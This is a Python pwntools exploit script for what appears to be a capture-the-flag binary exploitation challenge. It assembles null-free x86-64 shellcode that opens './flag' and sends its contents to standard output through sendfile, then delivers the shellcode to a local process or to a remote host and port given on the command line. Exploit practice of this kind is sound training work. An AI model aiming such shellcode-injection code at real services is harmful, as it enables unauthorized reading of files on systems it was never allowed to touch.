from pwn import *
from grwnapy.pwn import find_offset


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './challenge/binary-exploitation-null-free-shellcode'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")
flag_last_4 = enhex(b"flag"[::-1])
flag_first_2 = enhex(b"./"[::-1])

print(flag_last_4)
print(flag_first_2)
shellcode_asm = f"""
mov al, 2
mov ebx, {"0x"+flag_last_4}
shl rbx, 16
mov bx, {"0x"+flag_first_2}
push rbx
mov rdi, rsp
xor rsi, rsi    # ensure rsi is 0
syscall

xor rdi, rdi
mov dil, 1
mov rsi, rax
xor rbx, rbx
mov bx, 1000
mov r10, rbx
xor rdx, rdx
xor rax, rax
mov al, 40
syscall
"""

payload = asm(shellcode_asm)
print(disasm(payload))
assert (b'\x00' not in payload)
io = start()

io.send(payload)
# res = io.recvall()
# if b"pwn" in res:
    # break
io.interactive()
# 67616c66
# 2f2e